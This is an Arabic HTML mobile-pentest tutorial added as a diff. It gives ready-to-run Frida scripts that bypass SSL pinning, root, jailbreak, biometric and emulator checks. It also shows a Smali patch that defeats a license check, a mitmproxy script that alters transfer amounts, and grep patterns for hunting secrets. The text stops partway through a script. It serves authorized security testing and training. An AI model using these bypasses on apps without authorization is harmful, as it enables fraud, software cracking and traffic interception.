@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Mobile Pentest Toolbox — ملحق تقني عملي</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=JetBrains+Mono:wght@400;600&display=swap">
+<style>
+:root{--bg:#0b1014;--panel:#121a21;--line:#22303b;--tx:#d5dee6;--mut:#8a9aa8;--ac:#3ddc97;--ac2:#f5b942;--bad:#ff6b6b;--code:#0a0f13;color-scheme:dark;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+@media (prefers-color-scheme:light){:root:not([data-theme="dark"]){--bg:#f4f7f9;--panel:#fff;--line:#d3dde5;--tx:#1b2832;--mut:#586a78;--ac:#0b7a4b;--ac2:#9a6400;--bad:#c0392b;--code:#eaf0f4;color-scheme:light}}
+:root[data-theme="dark"]{--bg:#0b1014}
+html{scroll-padding-top:env(safe-area-inset-top,0px);scroll-behavior:smooth}
+*,*::before,*::after{box-sizing:inherit}
+body{margin:0;background:var(--bg);color:var(--tx);font:16px/1.9 Cairo,"Segoe UI",Tahoma,sans-serif}
+main{max-width:860px;margin:0 auto;padding:24px 18px 64px;counter-reset:sec}
+.mono,code,pre,.prompt,.tag,.eyebrow{font-family:"JetBrains Mono",ui-monospace,Consolas,monospace;direction:ltr;unicode-bidi:isolate}
+.prompt{color:var(--ac);font-size:14px;text-align:left}
+.eyebrow{color:var(--ac2);font-size:13px;text-align:left;margin-top:18px}
+h1{font-size:clamp(26px,5vw,40px);line-height:1.35;margin:6px 0 10px}
+h2{font-size:24px;margin:52px 0 6px;padding-top:18px;border-top:1px solid var(--line);counter-increment:sec;counter-reset:sub}
+h2 .n{font-family:"JetBrains Mono",monospace;color:var(--ac);margin-inline-end:10px;font-size:18px}
+h3{counter-increment:sub;font-size:19px;margin:30px 0 8px;color:var(--ac)}
+h3::before{content:counter(sec,decimal-leading-zero) "." counter(sub);font-family:"JetBrains Mono",monospace;font-size:13px;color:var(--ac2);margin-inline-end:10px;direction:ltr;unicode-bidi:isolate;display:inline-block}
+h4{font-size:16px;margin:20px 0 4px;color:var(--ac2)}
+p{margin:8px 0}
+.lead{color:var(--mut);max-width:70ch}
+.tags{display:flex;flex-wrap:wrap;gap:8px;margin:14px 0;direction:ltr}
+.tag{font-size:12px;border:1px solid var(--line);background:var(--panel);color:var(--mut);padding:2px 10px;border-radius:4px}
+nav ol{list-style:none;margin:8px 0;padding:0;display:grid;gap:6px}
+nav a{display:block;padding:8px 14px;background:var(--panel);border:1px solid var(--line);border-radius:6px;color:var(--tx);text-decoration:none}
+nav a:hover,nav a:focus-visible{border-color:var(--ac);outline:none}
+nav a b{font-family:"JetBrains Mono",monospace;color:var(--ac);margin-inline-end:10px}
+nav a small{color:var(--mut);font-family:"JetBrains Mono",monospace;direction:ltr;unicode-bidi:isolate}
+blockquote{margin:14px 0;padding:10px 16px;background:var(--panel);border-inline-start:3px solid var(--ac);border-radius:4px}
+blockquote.w{border-inline-start-color:var(--ac2)}
+blockquote.b{border-inline-start-color:var(--bad)}
+blockquote p{margin:4px 0}
+.tw{overflow-x:auto;margin:14px 0;border:1px solid var(--line);border-radius:6px}
+table{border-collapse:collapse;width:100%;font-size:14.5px;line-height:1.7}
+th,td{padding:8px 12px;text-align:start;border-bottom:1px solid var(--line);vertical-align:top}
+th{background:var(--panel);color:var(--ac);white-space:nowrap}
+tr:last-child td{border-bottom:0}
+td:first-child{font-weight:600;white-space:nowrap}
+code{background:var(--code);padding:1px 6px;border-radius:3px;font-size:.88em;color:var(--ac2)}
+pre{background:var(--code);border:1px solid var(--line);border-radius:6px;padding:12px 16px;overflow-x:auto;font-size:13px;line-height:1.7;text-align:left;margin:12px 0}
+pre code{background:none;padding:0;color:var(--tx)}
+ul{padding-inline-start:22px;margin:8px 0}li{margin:3px 0}
+.flow{direction:ltr;text-align:left}
+.eof{margin-top:56px;color:var(--mut);font-size:13px;text-align:left}
+@media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
+</style>
+</head>
+<body>
+<main>
+<div class="prompt">root@toolbox:~$</div>
+<div class="eyebrow">ملحق تقني · أدوات وتقنيات عملية متقدّمة · مبني على eMAPT Modules 1-3</div>
+<h1>Mobile Pentest Toolbox — الأدوات والتقنيات بالتطبيق الفعلي</h1>
+<p class="lead">ملحق عملي بالكامل: أوامر حقيقية وسكريبتات جاهزة للنسخ واللصق — تجهيز المعمل، Frida hooks فعلية (SSL pinning، root detection، biometric)، تعديل Smali وإعادة التوقيع، اعتراض ترافيك iOS/Android end-to-end، أتمتة static analysis، سكريبتات Python لكسر XOR وAndroguard، تحليل native بـ Ghidra، وحقيبة تخطّي كشف الـ Root/Jailbreak/Emulator الكاملة.</p>
+<div class="tags"><span class="tag">frida</span><span class="tag">smali-patching</span><span class="tag">ssl-pinning-bypass</span><span class="tag">androguard</span><span class="tag">ghidra</span><span class="tag">root-bypass</span></div>
+
+<div class="prompt">$ ls toolbox/</div>
+<nav><ol>
+<li><a href="#s1"><b>01</b>تجهيز المعمل الكامل <small>(Android + iOS)</small></a></li>
+<li><a href="#s2"><b>02</b>التعامل الأولي مع APK/IPA</a></li>
+<li><a href="#s3"><b>03</b>Frida من الصفر للاحتراف</a></li>
+<li><a href="#s4"><b>04</b>Objection: أوامر الاستخدام اليومي</a></li>
+<li><a href="#s5"><b>05</b>تعديل Smali: Patch فعلي وإعادة بناء</a></li>
+<li><a href="#s6"><b>06</b>iOS: استخراج وتحليل عملي</a></li>
+<li><a href="#s7"><b>07</b>اعتراض الترافيك End-to-End</a></li>
+<li><a href="#s8"><b>08</b>أتمتة الـ Static Analysis</a></li>
+<li><a href="#s9"><b>09</b>سكريبتات فكّ التعتيم بـ Python</a></li>
+<li><a href="#s10"><b>10</b>Androguard: تحليل آلي بـ Python</a></li>
+<li><a href="#s11"><b>11</b>Ghidra لتحليل مكتبات Native</a></li>
+<li><a href="#s12"><b>12</b>حقيبة تخطّي Root/Jailbreak/Emulator الكاملة</a></li>
+<li><a href="#s13"><b>13</b>أتمتة اختبار الـ API</a></li>
+<li><a href="#s14"><b>14</b>Pipeline شامل يجمع كل الخطوات</a></li>
+</ol></nav>
+
+<blockquote class="b"><p><b>تذكير:</b> كل أمر وسكريبت هنا للاستخدام على تطبيقات مصرَّح لك باختبارها قانونيًا بس (جهازك، أو عميل بتصريح مكتوب).</p></blockquote>
+
+<h2 id="s1"><span class="n">01</span>تجهيز المعمل الكامل</h2>
+<h3>Android: الأدوات الأساسية</h3>
+<pre><code># Android SDK platform-tools (adb, fastboot)
+sdkmanager "platform-tools" "emulator" "system-images;android-30;google_apis;x86_64"
+
+# jadx, apktool
+sudo apt install apktool
+pip install jadx # أو حمّل الـ release من GitHub مباشرة
+
+# Frida (على جهاز التحليل)
+pip install frida-tools objection
+
+# frida-server على الجهاز/الـ emulator (لازم يطابق معمارية الجهاز ونسخة frida-tools)
+adb push frida-server-16.*-android-x86_64 /data/local/tmp/frida-server
+adb shell "chmod 755 /data/local/tmp/frida-server"
+adb shell "su -c /data/local/tmp/frida-server &"</code></pre>
+<h3>iOS: الأدوات الأساسية</h3>
+<pre><code># على جهاز jailbroken (checkra1n/palera1n) عبر Cydia/Sileo:
+# OpenSSH, frida (من مستودع build.frida.re), class-dump, Cycript
+
+# من جهاز المحلل (Mac أو Linux مع libimobiledevice):
+pip install frida-tools objection
+brew install libimobiledevice ideviceinstaller
+
+# تفعيل SSH عبر USB (usbmuxd) بدل الاعتماد على شبكة Wi-Fi
+iproxy 2222 22
+ssh -p 2222 root@localhost   # الباسورد الافتراضي: alpine</code></pre>
+<h3>Burp Suite: شهادة CA على الجهاز</h3>
+<pre><code># حمّل شهادة Burp بصيغة DER، حوّلها لـ PEM، واحسب اسم الملف بـ hash OpenSSL (مطلوب على Android 7+ لتثبيتها كـ system CA)
+openssl x509 -inform DER -in burp_cert.der -out burp_cert.pem
+HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp_cert.pem | head -1)
+mv burp_cert.pem ${HASH}.0
+
+# ادفعها لمخزن شهادات النظام (يتطلب root وremount)
+adb root && adb remount
+adb push ${HASH}.0 /system/etc/security/cacerts/
+adb shell chmod 644 /system/etc/security/cacerts/${HASH}.0
+adb reboot</code></pre>
+
+<h2 id="s2"><span class="n">02</span>التعامل الأولي مع APK/IPA</h2>
+<h3>استخراج سريع ومعلومات أولية</h3>
+<pre><code>file target_app.apk
+sha256sum target_app.apk
+aapt dump badging target_app.apk | grep -E "package|sdkVersion|uses-permission|launchable-activity"
+
+# فك التعبئة الكاملة (APK = ZIP)
+unzip -o target_app.apk -d app_unzipped/
+ls app_unzipped/   # AndroidManifest.xml (binary) classes.dex lib/ res/ assets/ META-INF/
+
+# تحويل manifest الثنائي لنص مقروء
+apktool d target_app.apk -o app_apktool -f
+cat app_apktool/AndroidManifest.xml</code></pre>
+<h3>Decompile كامل بـ jadx</h3>
+<pre><code>jadx -d output_jadx target_app.apk --show-bad-code --deobf
+# --deobf: يحاول يعيد تسمية الكلاسات/الدوال المعتّمة تلقائيًا بأسماء أوضح
+grep -rEn "(api_key|apikey|secret|token|Bearer |https?://)" output_jadx/sources/ | head -50</code></pre>
+<h3>iOS IPA</h3>
+<pre><code>unzip -o target_app.ipa -d ipa_out/
+cd ipa_out/Payload/*.app/
+plutil -convert xml1 Info.plist -o - | less
+otool -L TargetApp              # المكتبات الديناميكية المربوطة
+class-dump -H TargetApp -o headers/
+grep -rEn "https?://|sk_live|api_key" headers/ Info.plist</code></pre>
+
+<h2 id="s3"><span class="n">03</span>Frida من الصفر للاحتراف</h2>
+<h3>التحقق من الاتصال وسرد العمليات</h3>
+<pre><code>frida-ps -U                       # سرد العمليات على جهاز USB متصل
+frida-ps -Uai                      # بالتطبيقات المثبّتة (installed + running)
+frida -U -f com.target.app -l script.js --no-pause</code></pre>
+<h3>سكريبت تخطّي SSL Pinning عام (Android، multi-technique)</h3>
+<pre><code>// universal-ssl-pinning-bypass.js
+Java.perform(function () {
+    // 1) TrustManager القياسي
+    var TrustManager = Java.registerClass({
+        name: 'com.custom.TrustManager',
+        implements: [Java.use('javax.net.ssl.X509TrustManager')],
+        methods: {
+            checkClientTrusted: function (chain, authType) {},
+            checkServerTrusted: function (chain, authType) {},
+            getAcceptedIssuers: function () { return []; }
+        }
+    });
+    var SSLContext = Java.use('javax.net.ssl.SSLContext');
+    SSLContext.init.overload(
+        '[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom'
+    ).implementation = function (keyManager, trustManager, secureRandom) {
+        this.init(keyManager, [TrustManager.$new()], secureRandom);
+        console.log('[+] SSLContext.init() bypassed');
+    };
+
+    // 2) OkHttp3 CertificatePinner.check
+    try {
+        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
+        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function (host, pins) {
+            console.log('[+] OkHttp3 CertificatePinner.check bypassed for ' + host);
+        };
+    } catch (e) {}
+
+    // 3) TrustKit
+    try {
+        var TrustKit = Java.use('com.datatheorem.android.trustkit.pinning.OkHostnameVerifier');
+        TrustKit.verify.overload('java.lang.String', 'javax.net.ssl.SSLSession').implementation = function () { return true; };
+    } catch (e) {}
+});</code></pre>
+<h3>سكريبت تخطّي كشف الـ Root (Android)</h3>
+<pre><code>// root-detection-bypass.js
+Java.perform(function () {
+    var fileClass = Java.use('java.io.File');
+    fileClass.exists.implementation = function () {
+        var path = this.getAbsolutePath();
+        var suspicious = ['su', 'Superuser.apk', 'magisk', 'busybox'];
+        for (var i = 0; i < suspicious.length; i++) {
+            if (path.indexOf(suspicious[i]) !== -1) {
+                console.log('[+] Hid file check: ' + path);
+                return false;
+            }
+        }
+        return this.exists();
+    };
+
+    var buildClass = Java.use('android.os.Build');
+    // لو التطبيق بيفحص ro.build.tags == "test-keys" عبر System.getProperty
+    var SystemClass = Java.use('java.lang.System');
+    SystemClass.getProperty.overload('java.lang.String').implementation = function (key) {
+        if (key === 'ro.build.tags') return 'release-keys';
+        return this.getProperty(key);
+    };
+
+    // تعطيل Runtime.exec("su") المباشر
+    var Runtime = Java.use('java.lang.Runtime');
+    Runtime.exec.overload('java.lang.String').implementation = function (cmd) {
+        if (cmd.indexOf('su') !== -1) {
+            console.log('[+] Blocked Runtime.exec: ' + cmd);
+            throw new (Java.use('java.io.IOException'))('not found');
+        }
+        return this.exec(cmd);
+    };
+});</code></pre>
+<h3>سكريبت إجبار نجاح البصمة (Biometric Bypass)</h3>
+<pre><code>// biometric-bypass.js — يستهدف AuthenticationCallback من BiometricPrompt
+Java.perform(function () {
+    var AuthCallback = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
+    // Hook بديل، ينطبق غالبًا على androidx.biometric.BiometricPrompt$AuthenticationCallback
+    try {
+        var AndroidXCallback = Java.use('androidx.biometric.BiometricPrompt$AuthenticationCallback');
+        AndroidXCallback.onAuthenticationError.implementation = function (code, msg) {
+            console.log('[*] onAuthenticationError suppressed: ' + msg);
+            // لا تستدعي الأصلية — امنع ظهور رسالة الفشل
+        };
+    } catch (e) { console.log(e); }
+
+    // Hook لدالة محلية شائعة اسمها isFingerprintValid أو مشابه
+    // استبدل اسم الكلاس/الدالة بما تلاقيه في jadx فعليًا
+    var TargetAuth = Java.use('com.target.app.auth.BiometricHelper');
+    TargetAuth.isFingerprintValid.implementation = function () {
+        console.log('[+] Forced isFingerprintValid() = true');
+        return true;
+    };
+});</code></pre>
+<h3>Hook على دالة native (مكتبة .so)</h3>
+<pre><code>// native-hook.js
+var moduleName = "libnative-lib.so";
+var targetOffset = 0x1A2B; // من Ghidra: عنوان الدالة ناقص عنوان بداية الـ module
+var base = Module.findBaseAddress(moduleName);
+Interceptor.attach(base.add(targetOffset), {
+    onEnter: function (args) {
+        console.log("[native] arg0 = " + args[0]);
+        this.arg0 = args[0];
+    },
+    onLeave: function (retval) {
+        console.log("[native] return = " + retval);
+        retval.replace(0x1); // غيّر القيمة المرجعة لو احتجت
+    }
+});</code></pre>
+<h3>Hook عام لتسجيل كل استدعاءات Crypto (recon سريع)</h3>
+<pre><code>// crypto-logger.js
+Java.perform(function () {
+    var Cipher = Java.use('javax.crypto.Cipher');
+    Cipher.doFinal.overload('[B').implementation = function (input) {
+        console.log('[crypto] Cipher.doFinal input: ' + bytesToHex(input));
+        var result = this.doFinal(input);
+        console.log('[crypto] Cipher.doFinal output: ' + bytesToHex(result));
+        return result;
+    };
+    function bytesToHex(bytes) {
+        var hex = [];
+        for (var i = 0; i < bytes.length; i++) {
+            hex.push(('0' + (bytes[i] & 0xFF).toString(16)).slice(-2));
+        }
+        return hex.join('');
+    }
+});</code></pre>
+
+<h2 id="s4"><span class="n">04</span>Objection: أوامر الاستخدام اليومي</h2>
+<pre><code># تشغيل Objection على تطبيق (مع تخطّي pinning تلقائي مدمج)
+objection -g com.target.app explore
+
+# داخل الجلسة التفاعلية:
+android sslpinning disable
+android root disable
+android keystore list
+android keystore watch
+
+# استكشاف التخزين والملفات
+android hooking list classes
+android hooking search classes BiometricHelper
+android hooking watch class_method com.target.app.auth.BiometricHelper.isFingerprintValid --dump-args --dump-return
+
+ios nsurlsession ssl_pinning disable      # على iOS
+ios keychain dump
+ios plist cat Info.plist
+
+# تفريغ الذاكرة للبحث عن أسرار
+memory list modules
+memory search "AIzaSy" --string   # مثال: البحث عن Firebase API key نمطي</code></pre>
+
+<h2 id="s5"><span class="n">05</span>تعديل Smali: Patch فعلي وإعادة بناء</h2>
+<h3>مثال: تخطّي فحص ترخيص بإجبار النتيجة</h3>
+<pre><code>apktool d target_app.apk -o app_patch
+grep -rn "isLicenseValid" app_patch/smali*/ </code></pre>
+<p>لو لقيت دالة زي دي في <code>LicenseChecker.smali</code>:</p>
+<pre><code>.method public isLicenseValid()Z
+    .locals 1
+    invoke-direct {p0}, Lcom/target/app/LicenseChecker;->checkServer()Z
+    move-result v0
+    return v0
+.end method</code></pre>
+<p>عدّلها لترجّع <code>true</code> مباشرة من غير ما تنادي السيرفر أصلًا:</p>
+<pre><code>.method public isLicenseValid()Z
+    .locals 1
+    const/4 v0, 0x1
+    return v0
+.end method</code></pre>
+<h3>إعادة البناء والتوقيع</h3>
+<pre><code>apktool b app_patch -o app_patched_unsigned.apk
+
+# محاذاة zipalign (لازم قبل التوقيع)
+zipalign -v -p 4 app_patched_unsigned.apk app_patched_aligned.apk
+
+# توليد مفتاح توقيع (مرة واحدة فقط)
+keytool -genkey -v -keystore debug.keystore -alias androiddebugkey \
+  -storepass android -keypass android -keyalg RSA -keysize 2048 -validity 10000
+
+# التوقيع بـ apksigner
+apksigner sign --ks debug.keystore --ks-pass pass:android app_patched_aligned.apk
+apksigner verify app_patched_aligned.apk
+
+adb install -r app_patched_aligned.apk</code></pre>
+<blockquote class="w"><p>لو التطبيق بيعمل تحقق من التوقيع نفسه (signature/integrity check) هتحتاج كمان تدوّر على وتعدّل الدالة دي، أو تستخدم Frida لتخطّيها بدل الـ patch الدائم.</p></blockquote>
+
+<h2 id="s6"><span class="n">06</span>iOS: استخراج وتحليل عملي</h2>
+<h3>استخراج IPA مفكوك الحماية من جهاز Jailbroken</h3>
+<pre><code># frida-ios-dump يفك تشفير الـ binary (FairPlay) ويطلعه IPA عادي
+git clone https://github.com/AloneMonkey/frida-ios-dump
+pip install -r requirements.txt
+python3 dump.py com.target.app
+# الناتج: target_app.ipa جاهز للـ static analysis العادي (unzip, class-dump, jadx-equivalent)</code></pre>
+<h3>Cycript: تفاعل مباشر وقت التشغيل</h3>
+<pre><code>cycript -p TargetApp
+cy# [[UIApplication sharedApplication] delegate]
+cy# (NSString*)[[NSUserDefaults standardUserDefaults] objectForKey:@"auth_token"]
+cy# choose(NSClassFromString(@"LoginViewController"))   # سرد كل الكائنات الحية من كلاس معيّن</code></pre>
+<h3>Hopper / otool لتحليل الـ Binary</h3>
+<pre><code>otool -tV TargetApp | less          # disassembly لقسم الكود
+otool -I -tV TargetApp | grep -A2 "_isJailbroken"   # دوال مشبوهة بالاسم
+nm TargetApp | grep -i "jailbreak\|cydia\|license"</code></pre>
+<h3>Frida على iOS: تخطّي كشف Jailbreak</h3>
+<pre><code>// ios-jailbreak-bypass.js
+var paths = ["/Applications/Cydia.app", "/Library/MobileSubstrate/MobileSubstrate.dylib", "/bin/bash", "/usr/sbin/sshd"];
+var NSFileManager = ObjC.classes.NSFileManager.defaultManager();
+Interceptor.attach(ObjC.classes.NSFileManager['- fileExistsAtPath:'].implementation, {
+    onEnter: function (args) {
+        var path = ObjC.Object(args[2]).toString();
+        if (paths.indexOf(path) !== -1) {
+            this.fake = true;
+        }
+    },
+    onLeave: function (retval) {
+        if (this.fake) retval.replace(0x0);
+    }
+});</code></pre>
+
+<h2 id="s7"><span class="n">07</span>اعتراض الترافيك End-to-End</h2>
+<h3>Burp + Objection: السيناريو الكامل خطوة بخطوة</h3>
+<pre><code># 1. اضبط الـ proxy على الجهاز (Wi-Fi settings → Proxy → Manual) على IP وبورت Burp
+# 2. ثبّت شهادة Burp كـ system CA (قسم 01)
+# 3. شغّل التطبيق عبر Objection مع تعطيل pinning تلقائي
+objection -g com.target.app explore --startup-command "android sslpinning disable"
+
+# 4. أو عبر Frida مباشرة بسكريبت الـ pinning bypass من القسم 03
+frida -U -f com.target.app -l universal-ssl-pinning-bypass.js --no-pause
+
+# تحقق إن الترافيك ظاهر في Burp → Proxy → HTTP history</code></pre>
+<h3>mitmproxy كبديل سكريبتابل</h3>
+<pre><code>mitmdump -s intercept_script.py -p 8080</code></pre>
+<pre><code># intercept_script.py — تسجيل وتعديل كل طلب فيه "api/transfer"
+from mitmproxy import http
+
+def request(flow: http.HTTPFlow):
+    if "api/transfer" in flow.request.pretty_url:
+        print("[*] Intercepted transfer request:", flow.request.text)
+        # مثال: تعديل الكمية قبل الإرسال (اختبار IDOR/business logic)
+        body = flow.request.text.replace('"amount":100', '"amount":1')
+        flow.request.text = body
+
+def response(flow: http.HTTPFlow):
+    if flow.response and "api/user" in flow.request.pretty_url:
+        print("[*] Response:", flow.response.text[:300])</code></pre>
+<h3>بروتوكولات غير HTTP: WebSocket/MQTT عبر Frida</h3>
+<pre><code>// websocket-logger.js — hook على مكتبة OkHttp WebSocket شائعة
+Java.perform(function () {
+    var WebSocket = Java.use('okhttp3.internal.ws.RealWebSocket');
+    WebSocket.send.overload('java.lang.String').implementation = function (text) {
+        console.log('[ws:send] ' + text);
+        return this.send(text);
+    };
+});</code></pre>
+
+<h2 id="s8"><span class="n">08</span>أتمتة الـ Static Analysis</h2>
+<h3>MobSF عبر REST API (بدل الواجهة اليدوية)</h3>
+<pre><code>docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest
+
+curl -F "file=@target_app.apk" http://localhost:8000/api/v1/upload -H "Authorization: $MOBSF_API_KEY"
+# يرجع hash، استخدمه في:
+curl -X POST http://localhost:8000/api/v1/scan -d "hash=$HASH" -H "Authorization: $MOBSF_API_KEY"
+curl -X POST http://localhost:8000/api/v1/report_json -d "hash=$HASH" -H "Authorization: $MOBSF_API_KEY" -o report.json</code></pre>
+<h3>Semgrep: قواعد مخصصة لـ Android/iOS</h3>
+<pre><code># rule.yaml — كشف WebView بجافاسكريبت مفعّل من غير تحقق مصدر
+rules:
+  - id: insecure-webview-js-enabled
+    languages: [java]
+    severity: WARNING
+    message: "setJavaScriptEnabled(true) مع loadUrl من مدخل خارجي"
+    patterns:
+      - pattern: $WV.getSettings().setJavaScriptEnabled(true)
+
+semgrep --config rule.yaml output_jadx/sources/</code></pre>
+<h3>مكتبة Regex جاهزة للـ grep السريع</h3>
+<pre><code>grep -rEn '(?:api[_-]?key|secret|password|token)\s*[:=]\s*["\x27][0-9a-zA-Z_\-]{16,}["\x27]' output_jadx/sources/
+grep -rEn 'AIza[0-9A-Za-z\-_]{35}' .                        # Google API Key
+grep -rEn 'sk_live_[0-9a-zA-Z]{24,}' .                      # Stripe live key
+grep -rEn '(AES|DES|RSA)/ECB' output_jadx/sources/           # تشفير ECB ضعيف
+grep -rEn 'MessageDigest.getInstance\("(MD5|SHA-1)"\)' .     # هاش ضعيف
+grep -rEn 'TrustAllCerts|checkServerTrusted\(\)\s*\{\s*\}'  .  # تحقق شهادة فارغ</code></pre>
+
+<h2 id="s9"><span class="n">09</span>سكريبتات فكّ التعتيم بـ Python</h2>
+<h3>XOR بمفتاح معروف جزئيًا (Known-Plaintext)</h3>
+<pre><code>import base64
+
+ciphertext = base64.b64decode("AQU6AuLW")
+known_plain = b"https://"
+key = bytes(c ^ p for c, p in zip(ciphertext, known_plain))
+print("key candidate:", key)
+
+def xor_decrypt(data: bytes, key: bytes) -> bytes:
+    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
+
+print(xor_decrypt(ciphertext, key))</code></pre>
+<h3>اكتشاف طول مفتاح XOR متكرر (Index of Coincidence)</h3>
+<pre><code>from itertools import combinations
+
+def hamming_distance(a: bytes, b: bytes) -> int:
+    return sum(bin(x ^ y).count("1") for x, y in zip(a, b))
+
+def guess_keysize(data: bytes, max_len=40) -> int:
+    scores = {}
+    for size in range(2, max_len):
+        chunks = [data[i:i+size] for i in range(0, len(data) - size*2, size)][:4]
+        pairs = list(combinations(chunks, 2))
+        norm_dist = sum(hamming_distance(a, b) / size for a, b in pairs) / len(pairs)
+        scores[size] = norm_dist
+    return min(scores, key=scores.get)  # أقل مسافة = أرجح طول مفتاح
+
+print("likely key length:", guess_keysize(open("captured.bin","rb").read()))</code></pre>
+<h3>Brute-force لمفتاح XOR قصير (byte واحد أو كلمة سر قصيرة)</h3>
+<pre><code>import itertools, string
+
+def score_english(b: bytes) -> int:
+    common = b" etaoinETAOIN"
+    return sum(b.count(c) for c in common)
+
+ciphertext = bytes.fromhex("1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736")
+best = max(
+    ((bytes(c ^ k for c in ciphertext), k) for k in range(256)),
+    key=lambda pair: score_english(pair[0])
+)
+print(best[1], best[0])</code></pre>
+<h3>فكّ تشفير مفتاح context-dependent (مُشتق من device ID)</h3>
+<pre><code># لو عرفت (من jadx) إن المفتاح = MD5(ANDROID_ID + "salt_value")
+import hashlib
+
+def derive_key(android_id: str, salt: str) -> bytes:
+    return hashlib.md5((android_id + salt).encode()).digest()
+
+key = derive_key("9774d56d682e549c", "salt_value")
+print(xor_decrypt(ciphertext, key))</code></pre>
+
+<h2 id="s10"><span class="n">10</span>Androguard: تحليل آلي بـ Python</h2>
+<pre><code>pip install androguard</code></pre>
+<pre><code>from androguard.misc import AnalyzeAPK
+
+a, d, dx = AnalyzeAPK("target_app.apk")
+
+# كل الصلاحيات المطلوبة
+print(a.get_permissions())
+
+# كل الـ exported components (نقاط هجوم محتملة)
+for activity in a.get_activities():
+    if a.get_element("activity", activity, "exported") == "true":
+        print("Exported activity:", activity)
+
+# البحث عن كل استدعاء لدوال تشفير ضعيفة عبر الكود كله
+for method in dx.get_methods():
+    m = method.get_method()
+    if "Ljava/security/MessageDigest;" in str(m.get_class_name()) or True:
+        for _, call, _ in method.get_xref_to():
+            if "MessageDigest" in str(call) and ("MD5" in str(m) or "SHA-1" in str(m)):
+                print("Weak hash usage in:", m.full_name)
+
+# استخراج كل الـ strings اللي شكلها URL
+import re
+for s in dx.get_strings():
+    val = s.get_value() if hasattr(s, "get_value") else str(s)
+    if re.match(r"https?://", val):
+        print("URL found:", val)</code></pre>
+<h3>أتمتة فحص عينات كتير دفعة واحدة</h3>
+<pre><code>import glob
+from androguard.misc import AnalyzeAPK
+
+for path in glob.glob("samples/*.apk"):
+    try:
+        a, d, dx = AnalyzeAPK(path)
+        dangerous = [p for p in a.get_permissions() if "DANGEROUS" in p or "SMS" in p or "CONTACTS" in p]
+        print(path, "->", dangerous)
+    except Exception as e:
+        print(path, "FAILED:", e)</code></pre>
+
+<h2 id="s11"><span class="n">11</span>Ghidra لتحليل مكتبات Native</h2>
+<h3>استيراد وتحليل مكتبة .so</h3>
+<pre><code># استخرج المكتبة من lib/arm64-v8a/libnative-lib.so
+# افتح Ghidra → File → Import File → اختر libnative-lib.so
+# Language: ARM:LE:64:v8 (أو حسب المعمارية)
+# بعد الاستيراد: Analysis → Auto Analyze (فعّل كل الخيارات الافتراضية)</code></pre>
+<h3>Ghidra Script (Python) لسرد كل الدوال المصدَّرة اللي اسمها فيه "crypt" أو "key"</h3>
+<pre><code># find_crypto_funcs.py — شغّلها من Ghidra Script Manager
+from ghidra.program.model.symbol import SymbolType
+
+fm = currentProgram.getFunctionManager()
+for func in fm.getFunctions(True):
+    name = func.getName().lower()
+    if "crypt" in name or "key" in name or "aes" in name or "xor" in name:
+        print("[+] {} @ {}".format(func.getName(), func.getEntryPoint()))</code></pre>
+<h3>ربط عنوان Ghidra بـ offset لـ Frida</h3>
+<pre><code># العنوان اللي Ghidra بيوريه (مثال 0x00011A2B) هو الـ VA داخل الـ module
+# الـ offset اللي Frida محتاجه = هذا العنوان ناقص base address الموديول في الملف (غالبًا نفس القيمة لو الملف PIE بدون إزاحة تحميل إضافية)
+# تأكد بمقارنة عنوان أول دالة معروفة (مثل JNI_OnLoad) بين Ghidra وبين:
+frida -U -f com.target.app -e "console.log(Module.findExportByName('libnative-lib.so','JNI_OnLoad'))"</code></pre>
+<h3>Decompiler View: قراءة منطق C المُعاد بناؤه</h3>
+<p>بعد التحليل، دبل كليك على الدالة المستهدفة، وفي نافذة Decompile هتلاقي شبه-كود C. دوّر فيه على: مقارنات ثابتة (<code>== 0x1337</code>) بتشاور على فحص ترخيص، أو حلقات XOR بسيطة بتشاور على فك تشفير string مضمّن.</p>
+
+<h2 id="s12"><span class="n">12</span>حقيبة تخطّي Root/Jailbreak/Emulator الكاملة</h2>
+<h3>مستويات التخطّي من الأقل للأكتر تدخلًا</h3>
+<div class="tw"><table>
+<tr><th>المستوى</th><th>الأداة</th><th>الاستخدام</th></tr>
+<tr><td>1 — Hooking مؤقت</td><td>Frida + سكريبتات القسم 03</td><td>اختبار لمرة واحدة، أسهل تراجع</td></tr>
+<tr><td>2 — إخفاء على مستوى النظام</td><td>Magisk + Zygisk + Shamiko</td><td>إخفاء root من كل تطبيق، أدوم من hook واحد</td></tr>
+<tr><td>3 — Patch دائم في الـ APK</td><td>Smali patching (قسم 05)</td><td>الفحص يختفي في كل تشغيلة حتى من غير Frida</td></tr>
+</table></div>
+<h3>Magisk + Zygisk + Shamiko (الإعداد العملي)</h3>
+<pre><code># فعّل Zygisk من Magisk Manager → Settings → Zygisk
+# ثبّت موديول Shamiko من مستودع Magisk الرسمي
+# أضف التطبيقات المستهدَفة لقائمة الإخفاء (Magisk → Settings → Configure DenyList)
+# فعّل "Enforce DenyList"
+
+# تحقق من حالة الإخفاء
+adb shell su -c "magisk --denylist status"</code></pre>
+<h3>Play Integrity / SafetyNet Fix</h3>
+<pre><code># موديول شائع لتزييف شهادة Play Integrity (لتطبيقات بنكية بتفحص سلامة الجهاز)
+# ثبّته كموديول Magisk، ثم تحقق:
+# تطبيق "YASNAC" أو "Play Integrity API Checker" من المتجر لفحص النتيجة بعد التفعيل</code></pre>
+<h3>قائمة فحوصات Emulator الشائعة وكيف تتخطاها</h3>
+<pre><code>// emulator-bypass.js
+Java.perform(function () {
+    var Build = Java.use('android.os.Build');
+    Build.FINGERPRINT.value = "google/walleye/walleye:10/QP1A.190711.020/5742556:user/release-keys";
+    Build.MODEL.value = "Pixel 2";
